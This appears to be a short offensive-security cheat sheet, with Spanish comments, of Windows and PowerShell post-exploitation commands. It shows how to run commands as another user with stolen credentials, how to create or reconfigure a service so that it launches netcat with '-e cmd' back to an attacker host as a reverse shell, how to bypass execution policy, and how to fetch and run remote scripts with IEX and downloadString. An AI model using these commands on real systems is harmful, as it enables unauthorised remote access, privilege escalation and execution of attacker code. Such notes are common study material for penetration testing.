![[Pasted image 20230215173659.png]]

---

```powershell
# Buscar archivos en el sistema desde el directorio actual
> dir /r /s {name}
# Realizar una lectura del contenido de un archivo 
> type {file}
# Migrar a usuarios 
> cacls 
# Analizar los permisos de un archivo 
```


## Play with Scripts Block
```PowerShell
# Al tener credenciales, podriamos intentar ejecutar comandos con ese usuario para poder entablarnos una revershell
> $user = '{domain}\{name}'
# Guardamos en la variable user, el nombre del usuario
> $password = ConvertTo-SecureString '{password}' -AsPlainText -Force
# Guardamos en la variable password lo contraseÃ±a, ya que en texto claro nos traeria problemas.
> $cred = New-Object System.Management.Automation.PSCredential($user, $password)
# Creamos la credencial en la variable cred.
> Invoke-Command -ComputerName {computer_name} -Credential $cred -ScriptBlock { "command" }
```


## Create Reverse Shell Service
```powershell

> sc.exe create foo binPath="C:\Users\Dobliuw\Desktop\nc.exe -e cmd {RHOST} {RPORT}"
```


## Manipulate Service Settings to Execute Reverse Shell
```powershell

> sc.exe config VMTools binPath="C:\Users\dobliuw\Desktop\nc.exe -e cmd {RHOST} {RPORT}"
```

  
## Start and Stop Service
```powershell
> sc.exe start {service}

> sc.exe stop {service}
```

  
## Download Files with Powershell
```powershell
> Invoke-WebRequest 'http://{dominio}/{recurso}' -OutFile ''
```

  
## Bypass Execution Policy
```powershell
> Set-ExecutionPolicy Bypass -Scope Process
```

  
## Interpret Powershell from Remote Server
```powershell

> IEX(New-Object Net.WebClient).downloadString('http://{dominio}/{recurso}')
```

```
